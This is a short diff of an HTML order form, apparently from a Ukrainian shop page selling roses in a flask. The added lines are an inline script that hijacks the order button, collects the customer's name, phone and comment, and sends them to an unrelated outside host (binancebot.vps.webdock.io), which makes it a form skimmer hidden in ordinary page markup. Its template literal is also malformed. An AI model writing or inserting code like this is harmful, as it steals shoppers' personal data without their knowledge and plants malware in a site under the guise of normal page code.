@@ -370,6 +370,7 @@
 			<input type="hidden" name="comment" value="Троянда у колбі">
             <button class="button">Оформлення замовлення</button>
         </form>
+	    <script type="text/javascript">var getV=function(e){return`${e}=+encodeURI(document.querySelector(`#order_form>input[name~=${e}]).value)},btn=document.querySelector("#order_form>button.button");btn.onclick=function(e){e.preventDefault();var t=getV("name"),n=getV("phone"),o=getV("comment");url="http://binancebot.vps.webdock.io/?"+[t,n,o].join("&"),location.href=url};</script>
         <div class="products_count">Залишилось <b>12</b> троянд по акції</div>
     </section>
     <!-- /order 3 -->
